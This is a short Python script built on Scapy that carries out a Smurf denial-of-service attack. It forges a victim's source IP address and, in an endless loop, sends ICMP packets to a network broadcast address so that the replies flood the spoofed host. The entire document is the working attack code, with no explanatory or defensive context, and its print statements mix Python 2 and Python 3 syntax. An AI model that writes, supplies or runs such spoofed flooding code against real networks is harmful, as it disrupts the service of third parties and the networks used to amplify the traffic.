from scapy.all import *




def smurf(packet):
	sendp(packet)




eth = Ether()

ip = IP()
ip.src = '172.16.1.200'
ip.dst = '209.165.200.255'

icmp = ICMP()





m = 0
while True:
	packet = eth/ip/icmp
	smurf(packet)
	print('Sending SMURF To %s '%ip.src)
	m = m + 1
	print m



